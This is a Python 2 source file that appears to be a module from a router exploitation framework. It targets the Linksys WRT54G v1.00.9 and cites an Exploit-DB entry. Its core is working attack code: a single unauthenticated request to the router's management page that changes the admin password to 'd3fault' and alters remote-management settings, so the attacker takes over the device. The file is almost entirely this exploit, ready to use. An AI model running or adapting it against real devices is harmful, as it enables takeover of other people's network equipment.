import urllib
import util
from ..router_vuln import RouterVuln


class wrt54g_reset_admin(RouterVuln):

    def __init__(self):
        self.router = 'WRT54G v1.00.9'
        self.vuln   = 'Reset Password'
        super(wrt54g_reset_admin, self).__init__()
    
        self.info = """Reset admin password
                    http://www.exploit-db.com/exploits/5313/
                    """  

    def initialize(self):
        util.Msg('Resetting admin password to \'d3fault\'...')
        try:
            url = 'http://%s/manage.tri?remote_mg_https=0&http_enable=1&https_enable=0' \
                  '&PasswdModify=1&http_passwd=d3fault&http_passwdConfirm=d3fault' \
                  '&_http_enable=1&web_wl_filter=1&remote_management=0&upnp=_enable=1'\
                  '&layout=en' % self.config['target'].value
            urllib.urlopen(url).read()
            util.Msg('Done')
        except Exception, e:
            util.Error('Error: %s' % e)
            return
